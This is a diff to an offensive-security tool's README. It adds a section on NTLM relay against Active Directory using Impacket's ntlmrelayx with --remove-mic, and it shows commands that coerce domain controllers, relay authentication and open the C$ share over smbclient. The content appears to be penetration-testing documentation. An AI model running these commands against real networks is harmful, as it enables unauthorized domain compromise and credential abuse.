@@ -57,7 +57,7 @@ python3 mseve.py -u <user> -p <password> -d <domain> <attacker_ip> <target_dc_ip
 
 ---
 
-# Offensive Workflow Example
+## Offensive Workflow Example
 
 1. **Enumerate coercion paths**
 
@@ -83,3 +83,19 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 smbclient -U <domain>/<user> //<target_dc_ip>/C$
 ```
 
+
+#### Remove MIC
+In modern Active Directory environments, NTLM authentication often includes a **Message Integrity Check (MIC)**. MIC ensures that the NTLM authentication messages have not been modified during transmission.
+
+The `--remove-mic` option in **Impacket’s `ntlmrelayx`** removes the MIC field from the NTLM authentication flow.
+
+This allows the attacker to:
+
+- Downgrade the authentication to a MIC‑less NTLM exchange.
+- Relay NTLM to services that do not strictly enforce MIC.
+- Successfully complete the NTLM relay attack.
+
+Execute the attack as previously explained, but changing the ntlmrelayx command for the following one:
+```bash
+impacket-ntlmrelayx -tf targets.txt -smb2support --remove-mic
+```
